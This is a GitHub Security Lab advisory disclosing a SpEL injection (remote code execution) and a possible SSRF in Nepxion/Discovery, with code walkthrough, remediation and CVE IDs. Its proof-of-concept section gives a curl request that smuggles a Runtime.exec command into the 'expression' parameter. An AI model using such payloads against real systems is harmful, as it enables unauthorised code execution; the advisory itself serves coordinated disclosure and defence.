=== Content from securitylab.github.com_a0cc2dd5_20250114_192343.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

September 9, 2022
# GHSL-2022-033\_GHSL-2022-034: SpEL Injection in Nepxion/Discovery - CVE-2022-23463, CVE-2022-23464

[![Author avatar](https://avatars.githubusercontent.com/u/46056498)
Jorge Rosillo](https://github.com/jorgectf)

## Coordinated Disclosure Timeline

* 2022-05-22: Report sent to nepxion@qq.com
* 2022-06-12: Asked for a security contact to 1394997@qq.com
* 2022-06-20: Opened a public [issue](https://github.com/Nepxion/Discovery/issues/183)
* 2022-08-09: Maintainer closes the public issue
* 2022-08-21: Deadline expired
* 2022-09-06: `CVE-2022-23463` and `CVE-2022-23464` assigned

## Summary

`Nepxion/Discovery` is vulnerable to SpEL Injection in `discovery-commons` and a potential SSRF in `discovery-plugin-admin-center`.

## Product

Discovery

## Tested Version

[9f3e7a5](https://github.com/Nepxion/Discovery/tree/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330)

## Details

### Issue 1: SpEL Injection in `discovery-commons` (`GHSL-2022-033`)

[`DiscoveryExpressionResolver`](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-commons/discovery-common/src/main/java/com/nepxion/discovery/common/expression/DiscoveryExpressionResolver.java)’s `eval` method is evaluating [`expression`](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-commons/discovery-common/src/main/java/com/nepxion/discovery/common/expression/DiscoveryExpressionResolver.java#L37) with a `StandardEvaluationContext`, allowing the expression to reach and interact with Java classes such as `java.lang.Runtime`, leading to Remote Code Execution. There are two endpoints ([here](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-console/discovery-console-starter/src/main/java/com/nepxion/discovery/console/endpoint/StrategyEndpoint.java#L37) and [here](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-plugin-admin-center/discovery-plugin-admin-center-starter/src/main/java/com/nepxion/discovery/plugin/admincenter/endpoint/StrategyEndpoint.java#L37)) taking user input into `expression`.

For instance, [`StrategyEndpoint`](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-console/discovery-console-starter/src/main/java/com/nepxion/discovery/console/endpoint/StrategyEndpoint.java) exposes a `/strategy/validate-expression` endpoint whose `expression` parameter flows to `strategyResource.validateExpression` in [1].

[`StrategyEndpoint.java`](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-console/discovery-console-starter/src/main/java/com/nepxion/discovery/console/endpoint/StrategyEndpoint.java)

```
@RestController
@RequestMapping(path = "/strategy")
...
public class StrategyEndpoint {
    @Autowired
    private StrategyResource strategyResource;

    @RequestMapping(path = "/validate-expression", method = RequestMethod.GET)
    ...
    public ResponseEntity<?> validateExpression(@RequestParam @ApiParam(value = "...", defaultValue = "...", required = true) String expression, @RequestParam(defaultValue = "", required = false) @ApiParam(value = "...", defaultValue = "a=1;b=1") String validation) {
        return doValidateExpression(expression, validation);
    }

    private ResponseEntity<?> doValidateExpression(String expression, String validation) {
        try {
            boolean result = strategyResource.validateExpression(expression, validation); // 1

            return ResponseUtil.getSuccessResponse(result);
        } catch (Exception e) {
            return ResponseUtil.getFailureResponse(e);
        }
    }
}

```

`StrategyResource` builds a Map with the `validation` parameter, but leaves `expression` intact, ultimately flowing to `DiscoveryExpressionResolver.eval` in [2].

[`StrategyResource.java`](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-console/discovery-console-starter/src/main/java/com/nepxion/discovery/console/resource/StrategyResourceImpl.java)

```
public class StrategyResourceImpl implements StrategyResource {
    private TypeComparator typeComparator = new DiscoveryTypeComparor();

    @Override
    public boolean validateExpression(String expression, String validation) {
        Map<String, String> map = null;
        try {
            map = StringUtil.splitToMap(validation);
        } catch (Exception e) {
            throw new DiscoveryException("Invalid format for validation input");
        }

        return DiscoveryExpressionResolver.eval(expression, DiscoveryConstant.EXPRESSION_PREFIX, map, typeComparator); // 2
    }
}

```

In `DiscoveryExpressionResolver`, the first `eval` method leaves, again, the `expression` parameter intact (in [3]) flowing to the second `eval` method, where `expression` gets evaluated using the vulnerable `StandardEvaluationContext` ([2]) in [4].

[`DiscoveryExpressionResolver.java`](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-commons/discovery-common/src/main/java/com/nepxion/discovery/common/expression/DiscoveryExpressionResolver.java)

```
public class DiscoveryExpressionResolver {
    private static final ExpressionParser EXPRESSION_PARSER = new SpelExpressionParser(); // 1

    public static boolean eval(String expression, String key, Map<String, String> map, TypeComparator typeComparator) {
        StandardEvaluationContext context = new StandardEvaluationContext(); // 2
        context.setTypeComparator(typeComparator);
        if (map != null) {
            context.setVariable(key, map);
        } else {
            context.setVariable(key, new HashMap<String, String>());
        }

        return eval(expression, context); // 3
    }

    public static boolean eval(String expression, StandardEvaluationContext context) {
        try {
            Boolean result = EXPRESSION_PARSER.parseExpression(expression).getValue(context, Boolean.class); // 4

            return result != null ? result.booleanValue() : false;
        } catch (Exception e) {
            return false;
        }
    }
}

```
#### Impact

This issue may lead to Remote Code Execution.

#### Remediation

Use [`SimpleEvaluationContext`](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.

#### Resources

##### POC

```
$ curl '127.0.0.1:9628/strategy/validate-expression?expression=T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27touch%20/tmp/vulnz%27%29&validation=a%3dtest'
$ ls -al /tmp/ | grep vulnz

```
### Issue 2: Potential SSRF in `discovery-plugin-admin-center` (`GHSL-2022-034`)

[RouterResourceImpl](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-plugin-admin-center/discovery-plugin-admin-center-starter/src/main/java/com/nepxion/discovery/plugin/admincenter/resource/RouterResourceImpl.java) uses `RestTemplate`’s [`getForEntity`](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-plugin-admin-center/discovery-plugin-admin-center-starter/src/main/java/com/nepxion/discovery/plugin/admincenter/resource/RouterResourceImpl.java#L130) [2] to retrieve the contents of a URL containing user-controlled input [1] from [this endpoint](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-plugin-admin-center/discovery-plugin-admin-center-starter/src/main/java/com/nepxion/discovery/plugin/admincenter/endpoint/RouterEndpoint.java#L55).

[RouterResourceImpl.java](https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-plugin-admin-center/discovery-plugin-admin-center-starter/src/main/java/com/nepxion/discovery/plugin/admincenter/resource/RouterResourceImpl.java)

```
public List<RouterEntity> getRouterEntityList(String routeServiceId, String routeProtocol, String routeHost, int routePort, String routeContextPath) {
        String url = routeProtocol + "://" + routeHost + ":" + routePort + routeContextPath + "router/route/" + routeServiceId; // 1

        String result = null;
        try {
            result = routerRestTemplate.getForEntity(url, String.class).getBody(); // 2
        } catch (RestClientException e) {
            throw new DiscoveryException("Failed to execute to route, serviceId=" + routeServiceId + ", url=" + url, e);
        }

        if (StringUtils.isEmpty(result)) {
            return null;
        }

        List<RouterEntity> routerEntityList = JsonUtil.fromJson(result, new TypeReference<List<RouterEntity>>() {
        });

        return routerEntityList;
    }

```
#### Impact

This issue may lead to Information Disclosure.

## CVE

* CVE-2022-23463
* CVE-2022-23464

## Credit

These issues were discovered and reported by GHSL team member [@jorgectf (Jorge Rosillo)](https://github.com/jorgectf).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2022-033` or `GHSL-2022-034` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information


